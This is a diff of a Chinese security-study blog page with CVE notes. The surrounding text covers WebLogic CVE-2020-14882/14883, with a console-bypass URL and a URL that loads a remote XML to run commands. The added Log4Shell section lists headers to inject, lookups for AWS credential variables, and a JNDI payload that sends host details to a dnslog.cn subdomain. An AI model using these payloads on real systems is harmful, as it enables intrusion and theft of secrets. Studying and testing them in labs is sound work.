@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.3k</span>
+            <span class="post-count">1.7k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">6 分钟</span>
+            <span class="post-count">8 分钟</span>
         </span>
     </span>
 </div>
@@ -119,7 +119,7 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
+  <h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
 <p>PHP版本：5.3.29nts</p>
 <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
 <p>PHP7 &lt; 7.0.10</p>
@@ -174,7 +174,7 @@
 
 <h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><p>允许未授权的用户绕过管理控制台的权限验证访问后台</p>
 <h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><p>允许后台任意用户通过HTTP协议执行任意命令</p>
-<h2 id="Weblogic-管理控制台未授权远程命令执行漏洞"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞" class="headerlink" title="(Weblogic 管理控制台未授权远程命令执行漏洞)"></a>(Weblogic 管理控制台未授权远程命令执行漏洞)</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>首先是cve-2020-14882</p>
+<h2 id="Weblogic-管理控制台未授权远程命令执行漏洞"><a href="#Weblogic-管理控制台未授权远程命令执行漏洞" class="headerlink" title="(Weblogic 管理控制台未授权远程命令执行漏洞)"></a>(Weblogic 管理控制台未授权远程命令执行漏洞)</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>首先是cve-2020-14882</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
 
 <p>可以通过未授权访问到管理页面</p>
@@ -189,6 +189,29 @@
 
 <p>访问以下url，让weblogic加载该xml，执行其中命令(需要Weblogic的服务器能够访问到恶意XML)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://example.com/rce.xml&quot;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="CVE-2021–44228-Log4Shell"><a href="#CVE-2021–44228-Log4Shell" class="headerlink" title="CVE-2021–44228 (Log4Shell)"></a>CVE-2021–44228 (Log4Shell)</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>如果记录用户控制的字符串，Java 日志库 log4j 存在未经身份验证的 RCE 漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache log4j 2.0-beta9 ≤ 2.14.1</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h3><p>将构造的有效负载注入头部、输入字段或查询&#x2F;正文参数中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Authorization</span><br><span class="line">Cache-Control</span><br><span class="line">Cf-Connecting_ip</span><br><span class="line">Client-Ip</span><br><span class="line">Contact</span><br><span class="line">Cookie</span><br><span class="line">Forwarded-For-Ip</span><br><span class="line">Forwarded-For</span><br><span class="line">Forwarded</span><br><span class="line">If-Modified-Since</span><br><span class="line">Originating-Ip</span><br><span class="line">Referer</span><br><span class="line">True-Client-Ip</span><br><span class="line">User-Agent</span><br><span class="line">X-Api-Version</span><br><span class="line">X-Client-Ip</span><br><span class="line">X-Forwarded-For</span><br><span class="line">X-Leakix</span><br><span class="line">X-Originating-Ip</span><br><span class="line">X-Real-Ip</span><br><span class="line">X-Remote-Addr</span><br><span class="line">X-Remote-Ip</span><br><span class="line">X-Wap-Profile</span><br><span class="line">Authorization: Basic</span><br><span class="line">Authorization: Bearer</span><br><span class="line">Authorization: Oauth</span><br><span class="line">Authorization: Token</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="可注入的信息"><a href="#可注入的信息" class="headerlink" title="可注入的信息"></a>可注入的信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;sys:user.name&#125;</span><br><span class="line">$&#123;sys:user.home&#125;</span><br><span class="line">$&#123;sys:user.dir&#125;</span><br><span class="line">$&#123;sys:java.home&#125;</span><br><span class="line">$&#123;sys:java.vendor&#125;</span><br><span class="line">$&#123;sys:java.version&#125;</span><br><span class="line">$&#123;sys:java.vendor.url&#125;</span><br><span class="line">$&#123;sys:java.vm.version&#125;</span><br><span class="line">$&#123;sys:java.vm.vendor&#125;</span><br><span class="line">$&#123;sys:java.vm.name&#125;</span><br><span class="line">$&#123;sys:os.name&#125;</span><br><span class="line">$&#123;sys:os.arch&#125;</span><br><span class="line">$&#123;sys:os.version&#125;</span><br><span class="line">$&#123;env:JAVA_VERSION&#125;</span><br><span class="line">$&#123;env:AWS_SECRET_ACCESS_KEY&#125;</span><br><span class="line">$&#123;env:AWS_SESSION_TOKEN&#125;</span><br><span class="line">$&#123;env:AWS_SHARED_CREDENTIALS_FILE&#125;</span><br><span class="line">$&#123;env:AWS_WEB_IDENTITY_TOKEN_FILE&#125;</span><br><span class="line">$&#123;env:AWS_PROFILE&#125;</span><br><span class="line">$&#123;env:AWS_CONFIG_FILE&#125;</span><br><span class="line">$&#123;env:AWS_ACCESS_KEY_ID&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务与扫描"><a href="#服务与扫描" class="headerlink" title="服务与扫描"></a>服务与扫描</h3><p>dnslog.cn呢是证明有该 <strong>服务</strong></p>
+<p><strong>扫描</strong>，可以用专门的log4j漏洞扫描器，去检测目标网址</p>
+<h3 id="有效负载"><a href="#有效负载" class="headerlink" title="有效负载"></a>有效负载</h3><p>构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://target.com/?test=$&#123;jndi:ldap://jv-$&#123;sys:java.version&#125;-hn-$&#123;hostName&#125;.qwe3er.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>使用<strong>dnslog.cn</strong>(一个网址，可以sql注入盲注时带外查询)去创建自己的子域名进行测试，比如：<code>qwe3er.dnslog.cn</code></li>
+<li>使用<strong>此子域</strong>来制作<strong>有效负载</strong>(上述负载)并将其与请求一起发送。一段时间后检查对 DNS 服务的请求以确认回调成功</li>
+<li>应该会收到类似的 DNS 服务请求（包含主机和 Java 版本）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jv-11.0.13-hn-73a957d15746.qwe3er.dnslog.cn</span><br></pre></td></tr></table></figure>
+
+
 
  
       <!-- reward -->
@@ -259,7 +282,7 @@
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/log4j/" rel="tag">log4j</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a></li></ul>
 
     </footer>
   </div>
